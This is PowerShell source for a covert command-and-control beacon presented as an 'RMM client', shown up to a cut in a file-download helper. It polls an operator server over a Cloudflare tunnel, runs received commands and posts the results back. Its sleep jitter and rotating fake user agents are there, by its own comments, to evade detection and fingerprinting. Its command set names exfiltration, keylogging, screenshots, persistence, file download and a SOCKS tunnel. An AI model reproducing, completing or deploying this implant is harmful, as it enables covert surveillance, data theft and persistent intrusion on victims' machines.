# Enhanced RMM PowerShell Client with Dynamic Configuration
#
# Edit the variables in the configuration block below. Optional environment overrides
# (RMM_BASE_URL, RMM_BEACON_SECRET, …) are applied immediately after that block.

# -----------------------------------------------------------------------------
# Configuration — edit these variables
# -----------------------------------------------------------------------------
#
# Server
#   $u                 RMM server base URL (no trailing slash).
#   $beaconSecret       Shared beacon token; must match server RMM_BEACON_SECRET.
#                       Leave empty only if the server runs with --insecure.
#
# Session identity
#   $sessionId          Beacon session GUID (new ID each run unless you set a fixed value).
#
# Beacon timing (server may override at runtime via __CONFIG__)
#   $baseSleepSeconds   Poll interval in seconds.
#   $jitterPercent      Random +/- percent applied to sleep and backoff.
#   $maxRetries         Short backoff cycles before a longer pause on errors.
#
# Server sync (internal — do not edit unless you know why)
#   $script:RmmRegisterConfigSynced
#                       Starts $false. Set to $true after the first successful
#                       /register in this process. Until then, register sends
#                       s=, j=, and sync=1 so the server adopts this script's
#                       $baseSleepSeconds and $jitterPercent (new sessions, or
#                       existing sessions on that one-time sync). Later beacons
#                       use operator set_sleep / set_jitter via __CONFIG__ only.
#
# HTTP transport
#   $persistentHttp     $true = reuse TCP + cookies across requests.
#   $httpProxy           Outbound proxy URI, e.g. http://proxy.corp:8080 (empty = direct).
#   $httpProxyUseDefaultCredentials
#                       $true = use Windows logon for proxy authentication (NTLM/Kerberos).
#
# Download transfer (agent → server file_upload chunks)
#   $downloadBurst       $false = pace each chunk like the beacon (sleep + jitter between POSTs).
#                       $true  = send all chunks back-to-back (throughput / lab only).
#
# Diagnostics
#   $verboseHttp         $true = log each request URL, wire IPv4, status, and error bodies.
#
# HTTP notes (not separate settings):
#   - Tunnel host is always reached over IPv4 (A records only; no IPv6-only DNS).
#   - Default transport closes TCP after each request unless $persistentHttp is $true.

$u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'
$beaconSecret = ''
$sessionId = [System.Guid]::NewGuid().ToString()

$baseSleepSeconds = 60
$jitterPercent = 30
$maxRetries = 3

$persistentHttp = $false
$downloadBurst = $false
$httpProxy = ''
$httpProxyUseDefaultCredentials = $false

$verboseHttp = $false

$script:RmmRegisterConfigSynced = $false
$script:RmmFastPoll = $false

# -----------------------------------------------------------------------------
# Optional environment overrides (when set, they replace the variables above)
# -----------------------------------------------------------------------------
if ($env:RMM_BASE_URL -and $env:RMM_BASE_URL.Trim().Length -gt 0) {
    $u = $env:RMM_BASE_URL.Trim().TrimEnd('/')
}
if ($env:RMM_BEACON_SECRET -and $env:RMM_BEACON_SECRET.Trim().Length -gt 0) {
    $beaconSecret = $env:RMM_BEACON_SECRET.Trim()
}
if ($env:RMM_VERBOSE -and $env:RMM_VERBOSE.Trim() -match '^(?i)(1|true|yes|on)$') {
    $verboseHttp = $true
}
if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
    $persistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
}
if ($env:RMM_DOWNLOAD_BURST -and $env:RMM_DOWNLOAD_BURST.Trim().Length -gt 0) {
    $downloadBurst = $env:RMM_DOWNLOAD_BURST.Trim() -match '^(?i)(1|true|yes|on)$'
}
if ($env:RMM_HTTP_PROXY -and $env:RMM_HTTP_PROXY.Trim().Length -gt 0) {
    $httpProxy = $env:RMM_HTTP_PROXY.Trim()
}
if ($env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS -and
    $env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS.Trim() -match '^(?i)(1|true|yes|on)$') {
    $httpProxyUseDefaultCredentials = $true
}

# -----------------------------------------------------------------------------
# Derived runtime state (do not edit unless you know why)
# -----------------------------------------------------------------------------
if ($u -match 'REPLACE-WITH-YOUR-CLOUDFLARED-URL') {
    Write-Host "[-] Set `$u in this script or set environment variable RMM_BASE_URL (no trailing slash)." -ForegroundColor Red
    exit 1
}

$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$currentRetry = 0
$script:RmmEverRegistered = $false
$script:RmmVerbose = [bool]$verboseHttp
$script:UsePersistentHttp = [bool]$persistentHttp
$script:DownloadBurst = [bool]$downloadBurst
$script:RmmShellCwd = (Get-Location).Path
if (-not ('RmmHostAnchor' -as [type])) {
    Add-Type -TypeDefinition @'
using System.Management.Automation.Runspaces;
public static class RmmHostAnchor {
    public static Runspace Beacon;
    public static void Restore() {
        if (Beacon != null && Runspace.DefaultRunspace != Beacon)
            Runspace.DefaultRunspace = Beacon;
    }
}
'@
}
[RmmHostAnchor]::Beacon = $host.Runspace
$script:RmmSocksWorker = @{
    Running    = $false
    Runspace   = $null
    PowerShell = $null
    Async      = $null
}
$script:RmmSocksLogQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()

if ($script:UsePersistentHttp) {
    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
} else {
    $script:RmmCookieContainer = $null
}

$script:RmmWebProxy = $null
if ($httpProxy -and $httpProxy.Trim().Length -gt 0) {
    try {
        $script:RmmWebProxy = New-Object System.Net.WebProxy ($httpProxy.Trim())
        $script:RmmWebProxy.BypassProxyOnLocal = $false
        if ($httpProxyUseDefaultCredentials) {
            $script:RmmWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
    } catch {
        Write-Host "[-] Invalid `$httpProxy: $httpProxy — $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

function Write-RmmLog {
    param(
        [Parameter(Mandatory = $true)][string]$Message,
        [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO'
    )
    if ($Level -eq 'DEBUG' -and -not $script:RmmVerbose) { return }
    $color = switch ($Level) {
        'WARN'  { 'Yellow' }
        'ERROR' { 'Red' }
        'DEBUG' { 'DarkGray' }
        default { 'Gray' }
    }
    $prefix = switch ($Level) {
        'DEBUG' { '[dbg]' }
        'WARN'  { '[!]' }
        'ERROR' { '[-]' }
        default { '[*]' }
    }
    Write-Host "$prefix $Message" -ForegroundColor $color
}

function Get-RmmHttpErrorBody {
    param([System.Net.HttpWebResponse]$Response)
    if (-not $Response) { return '' }
    try {
        $stream = $Response.GetResponseStream()
        if (-not $stream) { return '' }
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $text = $reader.ReadToEnd()
        $reader.Close()
        try { $Response.Close() } catch {}
        return ([string]$text).Trim()
    } catch {
        return ''
    }
}

function Get-RmmHttpResponseHeader {
    param(
        [System.Net.HttpWebResponse]$Response,
        [Parameter(Mandatory = $true)][string]$Name
    )
    if (-not $Response -or -not $Response.Headers) { return '' }
    try {
        return [string]$Response.Headers[$Name]
    } catch {
        return ''
    }
}

function Format-RmmHttpErrorBody {
    param(
        [string]$Body,
        [System.Net.HttpWebResponse]$Response = $null,
        [int]$MaxText = 1200
    )
    $lines = [System.Collections.Generic.List[string]]::new()
    if ($Response) {
        foreach ($header in @('CF-RAY', 'Server', 'CF-Cache-Status', 'Date', 'Content-Type')) {
            $val = Get-RmmHttpResponseHeader -Response $Response -Name $header
            if ($val) { $lines.Add("$header`: $val") }
        }
        $statusLine = [int]$Response.StatusCode
        if ($statusLine -gt 0) {
            $lines.Add("HTTP status: $statusLine $($Response.StatusDescription)")
        }
    }
    if ($Body) {
        if ($Body -match '(?is)<title[^>]*>([^<]+)</title>') {
            $lines.Add("HTML title: $($Matches[1].Trim())")
        }
        if ($Body -match '(?i)Error code (\d{3})') {
            $lines.Add("Cloudflare error code: $($Matches[1])")
        }
        if ($Body -match '(?i)Ray ID[^0-9a-f]*([0-9a-f]{16})') {
            $lines.Add("Ray ID: $($Matches[1])")
        }
        if ($Body -match '(?i)(cloudflare tunnel error|origin DNS error|unable to reach the origin|error\s+\d{3})') {
            $lines.Add("Snippet: $($Matches[1])")
        }
        $plain = ($Body -replace '(?s)<script[^>]*>.*?</script>', ' ' -replace '<[^>]+>', ' ' -replace '\s+', ' ').Trim()
        if ($plain.Length -gt $MaxText) {
            $plain = $plain.Substring(0, $MaxText) + '...'
        }
        if ($plain) {
            $lines.Add('Body (text):')
            $lines.Add($plain)
        }
    }
    if ($lines.Count -eq 0) { return '' }
    return ($lines -join [Environment]::NewLine)
}

function Write-RmmHttpErrorDetails {
    param(
        [System.Net.HttpWebResponse]$Response,
        [string]$Body,
        [int]$StatusCode = 0,
        [switch]$AlwaysShow
    )
    if ($StatusCode -le 0 -and $Response) {
        $StatusCode = [int]$Response.StatusCode
    }
    $show = $AlwaysShow -or $script:RmmVerbose -or $StatusCode -ge 500
    if (-not $show) { return }
    $formatted = Format-RmmHttpErrorBody -Body $Body -Response $Response
    if (-not $formatted) { return }
    Write-RmmLog '--- HTTP error response (Cloudflare / origin) ---' -Level WARN
    foreach ($line in ($formatted -split [Environment]::NewLine)) {
        if ($line) { Write-RmmLog $line -Level WARN }
    }
    Write-RmmLog '--- end HTTP error response ---' -Level WARN
}

function Get-RmmHttpStatusHint {
    param([int]$StatusCode)
    switch ($StatusCode) {
        401 { return 'Unauthorized — wrong or missing X-RMM-Beacon-Token (RMM_BEACON_SECRET).' }
        403 { return 'Forbidden — session killed or beacon secret rejected.' }
        404 { return 'Not found — check RMM_BASE_URL path.' }
        502 { return 'Bad gateway — tunnel/origin down (is cloudflared + server_rmm.py running?).' }
        503 { return 'Service unavailable — origin not ready.' }
        524 { return 'Cloudflare timeout (524) — cloudflared cannot reach server_rmm.py (tunnel --url port must match server; trycloudflare URL changes every cloudflared restart — update $u).' }
        default { return '' }
    }
}

function Write-RmmHttpFailure {
    param(
        [Parameter(Mandatory = $true)]$ErrorRecord,
        [string]$Context = ''
    )
    $ex = $ErrorRecord.Exception
    if ($ex.InnerException -is [System.Net.WebException]) {
        $ex = $ex.InnerException
    }
    $status = 0
    $body = ''
    if ($ex -is [System.Net.WebException] -and $ex.Response) {
        $status = [int]$ex.Response.StatusCode
        $httpResp = [System.Net.HttpWebResponse]$ex.Response
        $body = Get-RmmHttpErrorBody -Response $httpResp
        Write-RmmHttpErrorDetails -Response $httpResp -Body $body -StatusCode $status
    }
    $head = if ($Context) { "$Context — " } else { '' }
    if ($status -gt 0) {
        Write-RmmLog ("{0}HTTP {1} ({2})" -f $head, $status, $ex.Message) -Level ERROR
        $hint = Get-RmmHttpStatusHint -StatusCode $status
        if ($hint) { Write-RmmLog $hint -Level WARN }
    } else {
        Write-RmmLog ("{0}{1}" -f $head, $ex.Message) -Level ERROR
        if ($ex.Message -match 'timed out|timeout') {
            Write-RmmLog 'Request timed out — tunnel URL may be stale (trycloudflare changes each cloudflared restart), origin down, or network blocked.' -Level WARN
        }
    }
    if ($body) {
        $preview = Format-RmmHttpErrorBody -Body $body -MaxText 400
        if ($preview) {
            Write-RmmLog "Response summary:`n$preview" -Level $(if ($status -ge 500) { 'WARN' } else { 'DEBUG' })
        }
    }
    if ($status -eq 0 -and $ex.Message -match 'actively refused') {
        Write-RmmLog "Nothing listening at that host:port on this machine. Start server_rmm.py or fix RMM_BASE_URL." -Level WARN
    }
}

function Get-RmmRequestHeaders {
    param([string]$UserAgent = (Get-RandomUserAgent))
    $h = @{
        "User-Agent" = $UserAgent
        "Accept" = "*/*"
        "Cache-Control" = "no-cache"
    }
    if ($beaconSecret) {
        $h["X-RMM-Beacon-Token"] = $beaconSecret
    }
    return $h
}

function Resolve-RmmTunnelIpv4 {
    param([Parameter(Mandatory = $true)][System.Uri]$Uri)
    $hostPart = $Uri.Host
    if ($hostPart -match '^\[.*\]$') {
        throw "RMM: IPv6 URL hosts are not supported. Use the tunnel hostname or an IPv4 address."
    }
    $parsed = $null
    if ([System.Net.IPAddress]::TryParse($hostPart, [ref]$parsed)) {
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            return @{ Ipv4 = $parsed; OriginalHost = $hostPart }
        }
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
            throw "RMM: IPv6 address in URL is not supported. Use a hostname with an A record or an IPv4 literal."
        }
    }
    $ipv4 = $null
    foreach ($a in [System.Net.Dns]::GetHostAddresses($hostPart)) {
        if ($a.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            $ipv4 = $a
            break
        }
    }
    if ($null -eq $ipv4) {
        throw "RMM: No IPv4 address for host '$hostPart' (IPv6-only or unresolved). The client cannot use IPv6 to reach the tunnel."
    }
    return @{ Ipv4 = $ipv4; OriginalHost = $hostPart }
}

function Convert-RmmHttpResponseContent {
    param(
        [string]$Raw,
        [string]$ContentType
    )
    if ($null -eq $Raw) { return $null }
    $trim = $Raw.Trim()
    if ($trim.Length -eq 0) { return $null }
    $ct = if ($ContentType) { $ContentType } else { '' }
    $looksJson = ($ct -match 'json') -or ($trim.StartsWith('{')) -or ($trim.StartsWith('['))
    if ($looksJson) {
        try {
            return $Raw | ConvertFrom-Json
        } catch {
            return $Raw
        }
    }
    return $Raw
}

function Invoke-RmmRestMethod {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [ValidateSet('Get', 'Post')][string]$Method = 'Get',
        [object]$Body,
        [string]$ContentType,
        [hashtable]$Headers = @{},
        [ValidateSet('Continue', 'Stop', 'SilentlyContinue', 'Ignore')][string]$RestErrorAction = 'Continue'
    )
    if ($null -eq $Headers) { $Headers = @{} }

    $origUri = $null
    try {
        $origUri = [System.Uri]::new($Uri)
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $resolved = $null
    try {
        $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $builder = New-Object System.UriBuilder $origUri
    $builder.Host = $resolved.Ipv4.ToString()
    $wireUri = $builder.Uri

    $proxyNote = if ($script:RmmWebProxy) { " Proxy=$httpProxy" } else { '' }
    Write-RmmLog "$Method $origUri -> wire $($resolved.Ipv4) Host=$($resolved.OriginalHost) KeepAlive=$($script:UsePersistentHttp)$proxyNote" -Level DEBUG

    $req = [System.Net.HttpWebRequest]::Create($wireUri)
    $req.Method = $Method
    $req.Host = $resolved.OriginalHost
    $req.AllowAutoRedirect = $true
    $req.Timeout = 300000
    $req.ReadWriteTimeout = 120000
    # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
    # Persistent mode: keep-alive on so one TCP can carry multiple requests.
    $req.KeepAlive = [bool]$script:UsePersistentHttp
    if ($script:RmmWebProxy) {
        $req.Proxy = $script:RmmWebProxy
    }
    if ($script:UsePersistentHttp -and $script:RmmCookieContainer) {
        $req.CookieContainer = $script:RmmCookieContainer
    }

    foreach ($key in $Headers.Keys) {
        $name = [string]$key
        $val = [string]$Headers[$key]
        if ($name -match '(?i)^(User-Agent)$') {
            $req.UserAgent = $val
        } elseif ($name -match '(?i)^(Accept)$') {
            $req.Accept = $val
        } elseif ($name -match '(?i)^(Host|Connection)$') {
            continue
        } else {
            try {
                [void]$req.Headers.Add($name, $val)
            } catch {
                try {
                    $req.Headers[$name] = $val
                } catch {
                }
            }
        }
    }

    if ($Method -eq 'Post' -and $null -ne $Body) {
        if ($ContentType) {
            $req.ContentType = $ContentType
        } else {
            $req.ContentType = 'text/plain; charset=utf-8'
        }
        $enc = [System.Text.Encoding]::UTF8
        $bytes = $enc.GetBytes([string]$Body)
        $req.ContentLength = $bytes.Length
        $ws = $req.GetRequestStream()
        try {
            $ws.Write($bytes, 0, $bytes.Length)
        } finally {
            $ws.Close()
        }
    }

    try {
        $response = $req.GetResponse()
        $http = [System.Net.HttpWebResponse]$response
        $statusNum = [int]$http.StatusCode
        if ($statusNum -ge 400) {
            $errBody = Get-RmmHttpErrorBody -Response $http
            Write-RmmHttpErrorDetails -Response $http -Body $errBody -StatusCode $statusNum -AlwaysShow:($statusNum -ge 500)
            $hint = Get-RmmHttpStatusHint -StatusCode $statusNum
            $msg = "The remote server returned an error: ($statusNum) $($http.StatusCode)."
            if ($hint) { $msg += " $hint" }
            $summary = Format-RmmHttpErrorBody -Body $errBody -Response $http -MaxText 300
            if ($summary) {
                $firstLine = ($summary -split [Environment]::NewLine | Where-Object { $_ } | Select-Object -First 1)
                if ($firstLine) { $msg += " $firstLine" }
            }
            Write-RmmLog "HTTP $statusNum on $Method $origUri — $msg" -Level ERROR
            throw [System.Net.WebException]::new(
                $msg,
                $null,
                [System.Net.WebExceptionStatus]::ProtocolError,
                $http)
        }
        $rs = $http.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($rs, [System.Text.Encoding]::UTF8)
        $raw = $reader.ReadToEnd()
        $reader.Close()
        $ctOut = $http.ContentType
        $http.Close()
        Write-RmmLog "HTTP $statusNum $Method $origUri ($($raw.Length) bytes)" -Level DEBUG
        return (Convert-RmmHttpResponseContent -Raw $raw -ContentType $ctOut)
    } catch [System.Net.WebException] {
        $we = $_.Exception
        $eb = ''
        $logLevel = if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore') { 'DEBUG' } else { 'ERROR' }
        if ($we.Response) {
            $st = [int]$we.Response.StatusCode
            $httpResp = [System.Net.HttpWebResponse]$we.Response
            Write-RmmLog "WebException HTTP $st on $Method $origUri — $($we.Message)" -Level $logLevel
            $hint = Get-RmmHttpStatusHint -StatusCode $st
            if ($hint) { Write-RmmLog $hint -Level $(if ($logLevel -eq 'DEBUG') { 'DEBUG' } else { 'WARN' }) }
            $eb = Get-RmmHttpErrorBody -Response $httpResp
            Write-RmmHttpErrorDetails -Response $httpResp -Body $eb -StatusCode $st -AlwaysShow:($st -ge 500)
        } else {
            Write-RmmLog "WebException on $Method $origUri — $($we.Message)" -Level $logLevel
        }
        $enriched = $we.Message
        if ($we.Response) {
            $st = [int]$we.Response.StatusCode
            $hint = Get-RmmHttpStatusHint -StatusCode $st
            if ($hint) { $enriched += " $hint" }
        }
        if ($eb) {
            $summary = Format-RmmHttpErrorBody -Body $eb -Response $httpResp -MaxText 300
            if ($summary) {
                $firstLine = ($summary -split [Environment]::NewLine | Where-Object { $_ } | Select-Object -First 1)
                if ($firstLine) { $enriched += " $firstLine" }
            }
        }
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            return $null
        }
        throw [System.Exception]::new($enriched, $we)
    } catch {
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            return $null
        }
        throw
    }
}

# Jitter function - adds random delay to avoid pattern detection
function Get-JitteredSleep {
    param(
        [int]$baseSeconds,
        [int]$jitterPercent,
        [switch]$Quiet
    )
    
    # Calculate jitter range
    $jitterRange = [int]($baseSeconds * ($jitterPercent / 100))
    $jitterValue = Get-Random -Minimum (-$jitterRange) -Maximum ($jitterRange + 1)
    $actualSleep = [Math]::Max(1, $baseSeconds + $jitterValue)
    
    # Add micro-jitter for additional randomness (milliseconds)
    $microJitter = Get-Random -Minimum 100 -Maximum 1000
    $totalMilliseconds = ($actualSleep * 1000) + $microJitter
    
    if (-not $Quiet) {
        Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
    }
    
    # Sleep using milliseconds only
    Start-Sleep -Milliseconds $totalMilliseconds
    return $actualSleep
}

function Wait-RmmDownloadChunkPace {
    if ($script:DownloadBurst) { return }
    $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent -Quiet
}

# Exponential backoff for retries
function Get-BackoffSleep {
    param([int]$retryCount)
    
    # Cap retryCount to prevent overflow
    $cappedRetry = [Math]::Min($retryCount, 10)
    
    # Calculate backoff using integer math
    $backoffSeconds = 1
    for ($i = 0; $i -lt $cappedRetry; $i++) {
        $backoffSeconds = $backoffSeconds * 2
        if ($backoffSeconds -gt 60) {
            $backoffSeconds = 60
            break
        }
    }
    
    # Ensure backoff is within bounds
    $backoffSeconds = [Math]::Max(1, [Math]::Min(60, $backoffSeconds))
    
    # Add jitter to backoff
    $jitteredBackoff = Get-JitteredSleep -baseSeconds $backoffSeconds -jitterPercent 30
    return $jitteredBackoff
}

# Update configuration from server (idle __CONFIG__ no-op returns early without log noise).
function Update-Configuration {
    param([string]$configString)
    
    $parts = $configString -split " "
    if ($parts.Count -ge 3) {
        try {
            $newSleep = [int]$parts[1]
            $newJitter = [int]$parts[2]
            # Server sends __CONFIG__ on every idle /cmd; skip logs and work when nothing changed.
            if ($newSleep -eq $script:baseSleepSeconds -and $newJitter -eq $script:jitterPercent -and
                $newSleep -ge 1 -and $newSleep -le 3600 -and $newJitter -ge 0 -and $newJitter -le 100) {
                return
            }
            
            Write-Host "[*] Processing configuration update: $configString" -ForegroundColor Cyan
            
            $changed = $false
            
            # Validate ranges
            if ($newSleep -ge 1 -and $newSleep -le 3600) {
                if ($newSleep -ne $script:baseSleepSeconds) {
                    $script:baseSleepSeconds = $newSleep
                    $changed = $true
                    Write-Host "[+] Sleep interval updated to $baseSleepSeconds seconds" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid sleep value: $newSleep (must be 1-3600)" -ForegroundColor Red
            }
            
            if ($newJitter -ge 0 -and $newJitter -le 100) {
                if ($newJitter -ne $script:jitterPercent) {
                    $script:jitterPercent = $newJitter
                    $changed = $true
                    Write-Host "[+] Jitter updated to $jitterPercent%" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid jitter value: $newJitter (must be 0-100)" -ForegroundColor Red
            }
            
            # Send acknowledgment only when values actually changed (server sends __CONFIG__ every idle poll)
            if ($changed) {
                try {
                    $ackUrl = "$u/result?id=$sessionId&type=config_ack"
                    $ackBody = "Configuration updated: Sleep=$baseSleepSeconds, Jitter=$jitterPercent%"
                    $ackHeaders = Get-RmmRequestHeaders
                    $ackResult = Invoke-RmmRestMethod -Uri $ackUrl -Method Post -Body $ackBody -Headers $ackHeaders -RestErrorAction SilentlyContinue
                    if ($null -ne $ackResult) {
                        Write-Host "[+] Configuration acknowledgment sent" -ForegroundColor DarkGray
                    } else {
                        Write-RmmLog "Configuration acknowledgment failed (server rejected POST /result)" -Level WARN
                    }
                } catch {
                    Write-RmmLog "Configuration acknowledgment failed: $($_.Exception.Message)" -Level WARN
                }
            }
        } catch {
            Write-Host "[-] Failed to parse configuration: $_" -ForegroundColor Red
        }
    }
}

# Helper function for Base64 encoding
function ConvertTo-Base64 {
    param([string]$text)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    return [Convert]::ToBase64String($bytes)
}

function ConvertFrom-Base64 {
    param([string]$base64)
    $bytes = [Convert]::FromBase64String($base64)
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# Randomized User-Agent to avoid fingerprinting
function Get-RandomUserAgent {
    $userAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
    )
    return $userAgents | Get-Random
}

# Safe JSON parser — Invoke-RestMethod already deserializes JSON to PSCustomObject
function Parse-CmdResponse {
    param($response)
    if ($null -eq $response) {
        return @{ command = ""; type = "none" }
    }
    if ($response -is [string]) {
        try {
            $o = $response | ConvertFrom-Json
            return Parse-CmdResponse -response $o
        } catch {
            Write-Host "[!] Received non-JSON string, treating as plain command" -ForegroundColor Yellow
            return @{ command = $response; type = "execute" }
        }
    }
    $cmd = $null
    $typ = $null
    foreach ($p in $response.PSObject.Properties) {
        if ($p.Name -match '^(?i)command$') { $cmd = [string]$p.Value }
        elseif ($p.Name -match '^(?i)type$') { $typ = [string]$p.Value }
    }
    if ($null -eq $cmd) { $cmd = '' }
    $socks = $false
    foreach ($p in $response.PSObject.Properties) {
        if ($p.Name -match '^(?i)socks_active$') { $socks = [bool]$p.Value }
    }
    if ($null -eq $typ) {
        $typ = if ([string]::IsNullOrWhiteSpace($cmd)) { 'none' } else { 'execute' }
    }
    return @{ command = $cmd; type = $typ; socks_active = $socks }
}

function Get-RmmCmdSocksActive {
    param($CmdData)
    if ($null -eq $CmdData) { return $false }
    if ($CmdData -is [hashtable]) {
        if ($CmdData.ContainsKey('socks_active')) { return [bool]$CmdData['socks_active'] }
        return [bool]$CmdData.socks_active
    }
    foreach ($p in $CmdData.PSObject.Properties) {
        if ($p.Name -match '^(?i)socks_active$') { return [bool]$p.Value }
    }
    return $false
}

function Drain-RmmSocksHostLog {
    [RmmHostAnchor]::Restore()
    if ($null -eq $script:RmmSocksLogQueue) { return }
    $line = $null
    while ($script:RmmSocksLogQueue.TryDequeue([ref]$line)) {
        $color = 'Gray'
        if ($line -match '^\[\+\]') { $color = 'Green' }
        elseif ($line -match '^\[\*\]') { $color = 'Cyan' }
        elseif ($line -match '^\[!\]') { $color = 'Yellow' }
        elseif ($line -match '^\[-\]') { $color = 'Red' }
        elseif ($line -match '^\[dbg\]') { $color = 'DarkGray' }
        Write-Host $line -ForegroundColor $color
    }
}

function Sync-RmmSocksChannelFromServer {
    param($CmdData)
    $active = Get-RmmCmdSocksActive -CmdData $CmdData
    if ($active -and -not $script:RmmSocksWorker.Running) {
        Start-RmmSocksChannelWorker
    } elseif (-not $active -and $script:RmmSocksWorker.Running) {
        Stop-RmmSocksChannelWorker
    }
    Drain-RmmSocksHostLog
    [RmmHostAnchor]::Restore()
}

function Get-RmmSocksPollActive {
    param($Poll)
    if ($null -eq $Poll) { return $false }
    $obj = $Poll
    if ($obj -is [string]) {
        try { $obj = $obj | ConvertFrom-Json } catch { return $false }
    }
    foreach ($p in $obj.PSObject.Properties) {
        if ($p.Name -match '^(?i)active$') { return [bool]$p.Value }
    }
    return $false
}

function Get-RmmSocksTasksFromPoll {
    param($Poll)
    if ($null -eq $Poll) { return @() }
    $obj = $Poll
    if ($obj -is [string]) {
        try { $obj = $obj | ConvertFrom-Json } catch { return @() }
    }
    $rawTasks = $null
    if ($obj -is [hashtable]) {
        if ($obj.ContainsKey('tasks')) { $rawTasks = $obj['tasks'] }
    } elseif ($null -ne $obj) {
        foreach ($p in $obj.PSObject.Properties) {
            if ($p.Name -match '^(?i)tasks$') { $rawTasks = $p.Value; break }
        }
    }
    if ($null -eq $rawTasks) { return @() }
    $normalized = New-Object System.Collections.ArrayList
    foreach ($t in @($rawTasks)) {
        if ($null -eq $t) { continue }
        if ($t -is [hashtable]) {
            [void]$normalized.Add($t)
        } else {
            $portVal = 0
            if ($null -ne $t.port) { $portVal = [int]$t.port }
            [void]$normalized.Add(@{
                op       = [string]$t.op
                id       = [string]$t.id
                host     = [string]$t.host
                port     = $portVal
                data_b64 = [string]$t.data_b64
            })
        }
    }
    return @($normalized)
}

function Sort-RmmSocksTasks {
    param($Tasks)
    if ($null -eq $Tasks -or $Tasks.Count -eq 0) { return @() }
    $connects = [System.Collections.ArrayList]@()
    $sends = [System.Collections.ArrayList]@()
    $closes = [System.Collections.ArrayList]@()
    $other = [System.Collections.ArrayList]@()
    foreach ($t in $Tasks) {
        $op = ([string]$t.op).ToLowerInvariant()
        switch ($op) {
            'connect' { [void]$connects.Add($t) }
            'send'    { [void]$sends.Add($t) }
            'close'   { [void]$closes.Add($t) }
            default   { [void]$other.Add($t) }
        }
    }
    return @($connects) + @($sends) + @($closes) + @($other)
}

function Test-RmmInternalCommand {
    param([string]$Line)
    $c = $Line.Trim()
    if (-not $c) { return $false }
    if ($c -match '^(?i)__EXIT__$') { return $true }
    if ($c -match '^(?i)__STOP__$') { return $true }
    if ($c -match '^(?i)__CONFIG__\s') { return $true }
    if ($c -match '^(?i)__DOWNLOAD__\s') { return $true }
    if ($c -match '^(?i)__EXFIL__$') { return $true }
    if ($c -match '^(?i)__UPLOAD__') { return $true }
    if ($c -match '^(?i)__SCREENSHOT__$') { return $true }
    if ($c -match '^(?i)__KEYLOG__\s') { return $true }
    if ($c -match '^(?i)__INSTALL_PERSIST__$') { return $true }
    if ($c -match '^(?i)__REMOVE_PERSIST__$') { return $true }
    return $false
}

# Text results include the originating command so the C2 can label output when the queue has many items.
function Send-RmmTextResult {
    param(
        [Parameter(Mandatory = $true)][string]$CommandLine,
        [Parameter(Mandatory = $true)][string]$Text,
        [hashtable]$Headers = @{}
    )
    $uri = "$u/result?id=$sessionId"
    $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
    $json = $payload | ConvertTo-Json -Compress -Depth 10
    try {
        Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
        return $true
    } catch {
        Write-RmmHttpFailure -ErrorRecord $_ -Context 'POST /result'
        return $false
    }
}

function Get-RmmRcloneCachePath {
    $dir = Join-Path $env:LOCALAPPDATA 'RMM'
    return @{
        Directory = $dir
        Binary    = (Join-Path $dir 'rclone.exe')
    }
}

function Save-RmmBeaconFile {
    param(
        [Parameter(Mandatory = $true)][string]$RelativeUrl,
        [Parameter(Mandatory = $true)][string]$DestPath,
        [hashtable]$Headers = @{}
    )
    $sep = if ($RelativeUrl -match '\?') { '&' } else { '?' }
    $uri = "$u$RelativeUrl${sep}id=$sessionId"
    $origUri = [System.Uri]::new($uri)
